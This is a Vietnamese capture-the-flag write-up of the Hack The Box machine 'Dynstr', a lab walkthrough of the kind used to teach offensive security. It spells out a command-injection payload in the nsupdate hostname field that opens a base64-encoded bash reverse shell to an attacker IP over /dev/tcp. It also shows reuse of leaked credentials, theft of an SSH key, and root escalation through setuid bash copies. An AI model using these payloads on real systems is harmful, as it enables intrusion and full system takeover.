# Write-up Machine "Dynstr" - Medium - HTB

## Bước 1: Enumeration

Sử dụng nmap để rà quét thì em thấy mục tiêu đang chạy web service trên cổng 80, SSH tại cổng 22 và DNS ở cổng 53: `nmap -p 10.10.10.244`

![](dynstr/1.jpg)

Truy cập web service tại cổng 80, ta được:

![](dynstr/2.jpg)

Chúng ta có được một số thông tin như domain, username và password:

![](dynstr/3.jpg)

Sử dụng gobuster để quét các đường dẫn trang web, em có được 1 đường dẫn là `/nic`. Đường dẫn `/nic` này có liên quan đến No-IP DDNS: https://www.noip.com/integrate/request.

![](dynstr/4.jpg)

## Bước 2: Lấy user flag

Theo hướng dẫn của trang web kia, ta tạo một requets gửi tới `/nic/update`, trong đó:

- myip là địa chỉ IP máy tấn công
- hostname em thử lần lượt 3 giá trị domains tìm được tại trang chính là: "dnsalias.htb", "dynamicdns.htb" và "no-ip.htb" đều không được, nhưng kết hợp cả 3 lại thành "dynamicdns.no-ip.htb" thì lại được
- Add thêm header `Authorization: Basic ZHluYWRuczpzbmRhbnlk` với `ZHluYWRuczpzbmRhbnlk` là giá trị mã hóa base64 của username:password tìm được tại trang chính (dynadns:sndanyd)

![](dynstr/5.jpg)

Trong quá trình tìm giá trị hostname, em nhận thấy nếu thêm các kí tự đặc biệt như `;` vào thì trang web sẽ trả về là `911 [nsupdate failed]`. Tìm hiểu về nsupdate thì em được biết đây là Dynamic DNS update utility, được dùng để submit Dynamic DNS update request.

![](dynstr/6.jpg)

Nếu như `nsupdate` là một binary thì có thể hệ thống sẽ thực thi nó, do vậy có thể khai thác để thực thi code, ở đây em sẽ sử dụng `nsupdate` để tạo một reverse shell. Payload: `bash -i &>/dev/tcp/10.10.14.37/9999 <&1` -> tạo reverse shell về cổng 9999, sau đó base64-encode payload được `YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjM3Lzk5OTkgPCYx`. Payload hoàn chỉnh: ``echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjM3Lzk5OTkgPCYx|base64 -d|bash``. Đoạn mã này sẽ in ra payload đã được mã hóa base64, sau đó giải mã và chạy nó sử dụng bash. Bước cuối cùng là URL Encode payload kia là xong: `%60echo%20YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjM3Lzk5OTkgPCYx%7Cbase64%20-d%7Cbash%60`

![](dynstr/7.jpg)

Sau đó dùng netcat lắng nghe tại cổng 9999, nếu đoạn code kia thực thi thành công thì sẽ tạo được reverse shell, nhưng lúc này mới chỉ là user `www-data`

![](dynstr/8.jpg)

`cd /home` ta thấy máy mục tiêu có 2 user là `bindmgr` và `dyna`

![](dynstr/9.jpg)

Tại thư mục của user `bindmgr`, ta thấy có bash binary với setuid, sử dụng nó để leo từ user `www-data` lên user `bindmgr` và lấy được flag user

![](dynstr/10.jpg)

## Bước 3: Lấy system flag

Vẫn tại thư mục /home/binmgr, file support-case-C62796521/strace-C62796521.txt cung cấp cho ta OpenSSH private key

![](dynstr/11.jpg)


Tiếp theo cần add địa chỉ IP máy tấn công vào zone sử dụng `nsupdate`

    nsupdate -k /etc/bind/infra.key
    > update add test.infra.dyna.htb. 86400 A 10.10.14.37
    >
    >
    > update add 37.14.10.10.in-addr.arpa. 300 PTR test.infra.dyna.htb.
    > send

Sau đó sử dụng OpenSSH key lấy được ở trên để ssh vào máy nạn nhân

![](dynstr/12.jpg)

Sử dụng lệnh `sudo -l` để xem được user có thể thực thi lệnh nào với quyền root, ở đây user có thể thực thi `bindmgr.sh` với quyền root

![](dynstr/13.jpg)

Chúng ta sẽ xem thử file `bindmgr.sh`:

    #!/usr/bin/bash

    # This script generates named.conf.bindmgr to workaround the problem
    # that bind/named can only include single files but no directories.
    #
    # It creates a named.conf.bindmgr file in /etc/bind that can be included
    # from named.conf.local (or others) and will include all files from the
    # directory /etc/bin/named.bindmgr.
    #
    # NOTE: The script is work in progress. For now bind is not including
    #       named.conf.bindmgr. 
    #
    # TODO: Currently the script is only adding files to the directory but
    #       not deleting them. As we generate the list of files to be included
    #       from the source directory they won't be included anyway.

    BINDMGR_CONF=/etc/bind/named.conf.bindmgr
    BINDMGR_DIR=/etc/bind/named.bindmgr

    indent() { sed 's/^/    /'; }

    # Check versioning (.version)
    echo "[+] Running $0 to stage new configuration from $PWD."
    if [[ ! -f .version ]] ; then
        echo "[-] ERROR: Check versioning. Exiting."
        exit 42
    fi
    if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
        echo "[-] ERROR: Check versioning. Exiting."
        exit 43
    fi

    # Create config file that includes all files from named.bindmgr.
    echo "[+] Creating $BINDMGR_CONF file."
    printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
    for file in * ; do
        printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
    done

    # Stage new version of configuration files.
    echo "[+] Staging files to $BINDMGR_DIR."
    cp .version * /etc/bind/named.bindmgr/

    # Check generated configuration with named-checkconf.
    echo "[+] Checking staged configuration."
    named-checkconf $BINDMGR_CONF >/dev/null
    if [[ $? -ne 0 ]] ; then
        echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
        named-checkconf $BINDMGR_CONF 2>&1 | indent
        exit 44
    else 
        echo "[+] Configuration successfully staged."
        # *** TODO *** Uncomment restart once we are live.
        # systemctl restart bind9
        if [[ $? -ne 0 ]] ; then
            echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
        else
        echo "[+] Restart of bind9 via systemctl succeeded."
        fi
    fi

Đi sâu vào từng phần:

    if [[ ! -f .version ]] ; then
        echo "[-] ERROR: Check versioning. Exiting."
        exit 42
    fi
    if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
        echo "[-] ERROR: Check versioning. Exiting."
        exit 43
    fi

Đoạn script này sẽ kiểm tra .version đã tồn tại hay chưa, nếu file chưa tồn tại thì chương trình sẽ thoát

    # Create config file that includes all files from named.bindmgr.
    echo "[+] Creating $BINDMGR_CONF file."
    printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
    for file in * ; do
        printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
    done
    # Stage new version of configuration files.
    echo "[+] Staging files to $BINDMGR_DIR."
    cp .version * /etc/bind/named.bindmgr/

Còn nếu file .version đã tồn tại thì chương trình sẽ tạo file `$BINDMGR_CONF` và copy file .version đến thư mục /etc/bind/named.bindmgr/

Do đó, ta sẽ tạo thử file .version với nội dung tùy ý: `echo 1 > .version` và chạy đoạn script `bindmgr.sh`

![](dynstr/14.jpg)

Kết quả cho thấy file .version và toàn bộ các file trong thư mục gốc đã được copy sang thư mục /etc/bind/named.bindmgr. 

Do toàn bộ các file trong thư mục đều được copy sang thư mục /etc/bind/named.bindmgr, nên giờ ta có thể tạo một bash binary, cấp quyền setuid, chạy script và bash binary đó sẽ được copy sang thư mục kia với ownership = root, từ đó ta có thể đạt được root shell.

![](dynstr/15.jpg)

Tiến hành chạy đoạn script, sau đó chạy file bash tại thư mục /etc/bind/named.bindmgr là sẽ đạt được root shell

![](dynstr/16.jpg)
